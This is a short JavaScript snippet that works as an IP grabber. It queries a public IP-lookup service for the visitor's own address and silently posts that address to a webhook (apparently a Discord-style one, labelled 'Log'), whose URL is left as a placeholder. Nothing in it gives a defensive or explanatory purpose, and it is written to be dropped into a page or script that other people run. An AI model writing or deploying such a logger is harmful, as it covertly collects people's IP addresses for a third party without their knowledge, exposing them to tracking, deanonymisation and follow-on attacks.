let webhook_url = 'webhook';
let req = new XMLHttpRequest();

req.open('GET', 'https://api.db-ip.com/v2/free/self');
req.send();
req.onload = () => {
    webhook(JSON.parse(req.response)['ipAddress'])
}

function webhook(text) {
    let xhr = new XMLHttpRequest();

    xhr.open('POST', webhook_url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.send(JSON.stringify({
        'content': text,
        'username': "Log"
    }))
}
